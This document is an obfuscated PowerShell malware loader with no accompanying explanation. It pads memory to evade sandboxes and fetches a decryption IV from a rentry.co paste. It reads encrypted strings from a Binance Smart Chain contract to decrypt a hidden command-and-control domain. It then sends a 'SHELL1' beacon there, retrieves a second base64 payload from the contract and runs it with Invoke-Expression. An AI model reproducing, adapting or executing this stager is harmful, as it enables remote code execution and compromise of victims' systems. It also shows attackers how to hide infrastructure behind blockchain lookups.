    $WvhiYWjQWF = (Get-Process -Id $PID | Select-Object Name,@{Name="rgba";Expression={($_.ws / 1024kb)}}).rgba
    if ($WvhiYWjQWF -lt 250) { $VMGEANJEep = "a" * 300MB }
    $UxuTbwUqRR = 0
    $HkktmgDTeq = 30000000

    $u7d9Tg2 = "https://bsc-dataseed1.binance.org/"

    function HxStr2BAr {
        param($hX)
        $bYt3s = New-Object Byte[] ($hX.Length / 2)
        for ($i = 0; $i -lt $bYt3s.Length; $i++) { $bYt3s[$i] = [Convert]::ToByte($hX.Substring($i * 2, 2), 16) }
        return $bYt3s
    }

	$a1b2c3 = "https://rentry.co/t5266q3p/raw"
	$x9y8z7 = Invoke-WebRequest -Uri $a1b2c3 -UseBasicParsing
	$ivContent = $x9y8z7.Content.Trim()

    function InvkCl {
        param($dT)
        $pLd = @{jsonrpc="2.0"; method="eth_call"; params=@(@{to="0xC12d0cA65b8bC87265b33C13Bab479e5D91cc08e"; data=$dT}, "latest"); id=44}
        return (Invoke-RestMethod -Uri $u7d9Tg2 -Method Post -Body ($pLd | ConvertTo-Json) -ContentType "application/json").result
    }

    function CvRt2Str {
        param($r5N3w9Lm)
        if ($null -ne $r5N3w9Lm -and $r5N3w9Lm.StartsWith("0x")) { $r5N3w9Lm = $r5N3w9Lm.Substring(2) }
        $z8Y5p3Vm = [byte[]]::new($r5N3w9Lm.Length / 2)
        for ($i = 0; $i -lt $r5N3w9Lm.Length; $i += 2) { $z8Y5p3Vm[$i / 2] = [Convert]::ToByte($r5N3w9Lm.Substring($i, 2), 16) }
        return [System.Text.Encoding]::ASCII.GetString($z8Y5p3Vm)
    }

    function DcyptStr {
        param (
            [Parameter(Mandatory=$true)]
            [string]$e6L8t3Fq,
            [Parameter(Mandatory=$true)]
            [string]$k4G7h9Pq,
            [Parameter(Mandatory=$true)]
            [string]$i3V9r6Pw
        )

        $u6F3g7Qp = New-Object System.Text.UTF8Encoding
        $c8R5v9Lm = [Convert]::FromBase64String($e6L8t3Fq)

        $a7N9r4Xz = New-Object System.Security.Cryptography.AesManaged
        $a7N9r4Xz.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $a7N9r4Xz.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $a7N9r4Xz.KeySize = 128
        $a7N9r4Xz.BlockSize = 128

        $k7W8r3Xz = $u6F3g7Qp.GetBytes($k4G7h9Pq)
        $a7N9r4Xz.Key = $k7W8r3Xz

        $i6P2s7Nv = HxStr2BAr $i3V9r6Pw
        $a7N9r4Xz.IV = $i6P2s7Nv

        $t3J7v9Rm = $a7N9r4Xz.CreateDecryptor()
        $p7U3v9Xz = $t3J7v9Rm.TransformFinalBlock($c8R5v9Lm, 0, $c8R5v9Lm.Length)

        return $u6F3g7Qp.GetString($p7U3v9Xz)
    }

    $r5L9t3Pq = InvkCl "0xc2fb26a6"
    if ($null -eq $r5L9t3Pq) { return }

    $a5S9p7Mz = CvRt2Str $r5L9t3Pq
    $d9P2v4Nj = (-join (@($a5S9p7Mz -split "`0") | ForEach-Object { if ($_.Length -gt 1) { $_.Substring(1) } else { $_ } })).TrimStart()
    if ([string]::IsNullOrEmpty($d9P2v4Nj)) { return }

    $k4F9m8Lp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SjVQRWI2WEpmbXlLVXF2Nw=="))
    $i3T9r6Pw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ivContent))
    $D6T2s9Np = DcyptStr -e6L8t3Fq $d9P2v4Nj -k4G7h9Pq $k4F9m8Lp -i3V9r6Pw $i3T9r6Pw
    if ([string]::IsNullOrEmpty($D6T2s9Np)) { return }

    function F7P2w9Nx {
        $p2W8r3Xz = "https://rsmbscm.$D6T2s9Np/post.php"
        $h7V3p6Nm = @{'U'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/23.0.0.0 Safari/537.36'}
        $b8J2s7Np = @{source_id='SHELL1'} | ConvertTo-Json
        Invoke-RestMethod -Uri $p2W8r3Xz -Method Post -Body $b8J2s7Np -ContentType 'application/json' -Headers $h7V3p6Nm
    }

    F7P2w9Nx

    $r7V2p9Nx = InvkCl "0xebe9eb9f"
    if ($null -eq $r7V2p9Nx) { return }

    $a8N5t3Pw = CvRt2Str $r7V2p9Nx
    $s3Q9v4Mz = (-join (@($a8N5t3Pw -split "`0") | ForEach-Object { if ($_.Length -gt 1) { $_.Substring(1) } else { $_ } })).Trim()
    if ($s3Q9v4Mz.Length -gt 1) { $s3Q9v4Mz = $s3Q9v4Mz.Substring(1) }

    $c8W7r3Lp = $s3Q9v4Mz.Trim() -replace '[\s\p{C}]', ''
    $d2P5x9Nm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c8W7r3Lp))
    Invoke-Expression $d2P5x9Nm
